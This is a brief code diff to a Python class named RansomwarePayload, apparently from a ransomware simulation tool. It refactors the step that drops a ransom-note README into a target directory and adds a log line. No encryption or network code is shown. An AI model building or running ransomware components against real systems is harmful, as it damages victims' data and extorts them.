@@ -81,7 +81,10 @@ class RansomwarePayload:
 
     def _leave_readme(self):
         if self._readme_enabled:
+            readme_dest_path = Path(self._target_dir) / README_DEST
+            LOG.info(f"Leaving a ransomware README file at {readme_dest_path}")
+
             try:
-                shutil.copyfile(README_SRC, Path(self._target_dir) / README_DEST)
+                shutil.copyfile(README_SRC, readme_dest_path)
             except Exception as ex:
                 LOG.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")
